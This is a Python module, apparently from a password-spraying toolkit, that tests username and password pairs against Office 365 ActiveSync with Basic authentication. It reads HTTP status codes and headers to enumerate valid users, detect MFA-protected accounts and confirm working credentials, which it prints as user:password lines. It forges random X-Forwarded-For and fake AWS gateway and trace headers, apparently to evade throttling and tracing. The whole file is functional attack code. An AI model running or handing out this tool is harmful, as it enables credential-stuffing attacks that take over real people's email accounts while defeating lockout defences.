import json, datetime, requests, random
from base64 import b64encode

def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def o365_authenticate(url, username, password, useragent):
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    #url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip' : None,
        'throttled' : False,
		'error' : False,
        'output' : ""
    }

    INVALID_LOGIN = "INVALID_LOGIN"
    INVALID_USER = "INVALID_USER"
    VALID_PASSWD_2FA = "VALID_PASSWD_2FA"
    VALID_LOGIN = "VALID_LOGIN"
    UNKNOWN = "UNKNOWN"

    symbols = {
        INVALID_LOGIN: "-",
        INVALID_USER: "-",
        VALID_PASSWD_2FA: "#",
        VALID_LOGIN: "!",
        UNKNOWN: "?"
    }
    template = "[{s}] {code} {valid} {user}:{password}"


    spoofed_ip = generate_ip()
    amazon_id = generate_id()
    trace_id = generate_trace_id()


    headers = {
        "MS-ASProtocolVersion": "14.0",
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
        "Authorization" : "Basic {}".format(b64encode("{}:{}".format(username,password).encode('ascii')).decode('ascii') )
    }

    auth = (username, password)

    try:
        r = requests.options("{}/Microsoft-Server-ActiveSync".format(url), headers=headers, timeout=30)
        # print(r.text)
        # print(r.status_code)
        # print(r.headers)
        status = r.status_code
        valid = ""

        if status == 401:
            valid = INVALID_LOGIN
            data_response['success'] = False
        elif status == 404:
            if r.headers.get("X-CasErrorCode") == "UserNotFound":
                valid = INVALID_USER
            data_response['success'] = False
        elif status == 403:
            valid = VALID_PASSWD_2FA
            data_response['success'] = True
            data_response['2fa_enabled'] = True
        elif status == 200:
            valid = VALID_LOGIN
            data_response['success'] = True

        data_response['output'] = template.format(s=symbols[valid], code=status, valid=valid, user=username, password=password)

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
